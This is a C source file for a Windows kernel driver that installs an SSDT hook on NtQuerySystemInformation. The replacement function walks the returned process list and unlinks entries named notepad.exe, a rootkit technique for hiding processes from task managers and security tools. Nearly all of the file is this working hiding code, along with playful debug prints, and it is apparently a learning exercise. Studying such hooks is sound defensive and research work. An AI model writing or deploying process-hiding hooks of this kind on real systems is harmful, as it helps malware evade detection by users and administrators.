#include "SSDT_Hook.h"

#define MYDEVICE_DEVICE_NAME     L"\\Device\\MyDriver"
#define MYDEVICE_DOS_DEVICE_NAME L"\\DosDevices\\MyDriver"

typedef struct _DEVICE_EXTENSION
{
    ULONG StateVariable;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;


VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);

NTSTATUS MyNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
);

PWCH TargetProcessName = L"notepad.exe";

NTSTATUS MyNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
)
{
	KdPrint(("[MyDriver] @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"));
	NTSTATUS ntstatus = STATUS_SUCCESS;
	KdPrint(("[MyDriver] NtQuerySystemInformation Address : 0x%X", (ULONG)OldNtQuerySystemInformation));
	ntstatus = ((NTQUERYSYSTEMINFORMATION)OldNtQuerySystemInformation)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if(NT_SUCCESS(ntstatus))
	{
		KdPrint(("[MyDriver] NtQuerySystemInformation Success!"));
		if(SystemInformationClass == SystemProcessInformation)
		{
			PSYSPROCESS PrevProcessInfo = NULL;
			PSYSPROCESS CurrProcessInfo = (PSYSPROCESS)SystemInformation;
			while(CurrProcessInfo != NULL)
			{
				KdPrint(("hahahahahhahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha"));
				PWCH CurrProcName = CurrProcessInfo->ImageName.Buffer;
				if(wcscmp(TargetProcessName, CurrProcName) == 0)
				{
					KdPrint(("[MyDriver] TargetProcessInfo is found!"));
					KdPrint(("=============================================================================================="));
					if(PrevProcessInfo)
					{
						if(CurrProcessInfo->NextEntryOffset)
						{
							PrevProcessInfo->NextEntryOffset += CurrProcessInfo->NextEntryOffset;
						}
						else
						{
							PrevProcessInfo->NextEntryOffset = 0;
						}
					}
					else
					{
						if(CurrProcessInfo->NextEntryOffset)
						{
							SystemInformation = (PVOID)((PCHAR)SystemInformation + CurrProcessInfo->NextEntryOffset);
						}
						else
						{
							SystemInformation = NULL;
						}
					}
				}
				PrevProcessInfo = CurrProcessInfo;
				if(CurrProcessInfo->NextEntryOffset)
				{
					CurrProcessInfo = (PSYSPROCESS)((ULONG)CurrProcessInfo + CurrProcessInfo->NextEntryOffset);
				}
				else
				{
					CurrProcessInfo = NULL;
				}
			}
		}
		KdPrint(("[MyDriver] MyNtQuerySystemInformation Success!"));
		KdPrint(("................................................................................................"));
		return STATUS_SUCCESS;
	}
	else
	{
		KdPrint(("[MyDriver] MyNtQuerySystemInformation Failed!"));
		KdPrint(("000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"));
		return STATUS_UNSUCCESSFUL;
	}
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	BackUpSSDT();
	InstallSSDTHook((ULONG)ZwQuerySystemInformation, (ULONG)MyNtQuerySystemInformation);
	KdPrint(("[MyDriver] All Success!"));
	DriverObject->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UnInstallSSDTHook((ULONG)ZwQuerySystemInformation);
	KdPrint(("[SSDTHook_Driver] Driver Unloaded!"));
}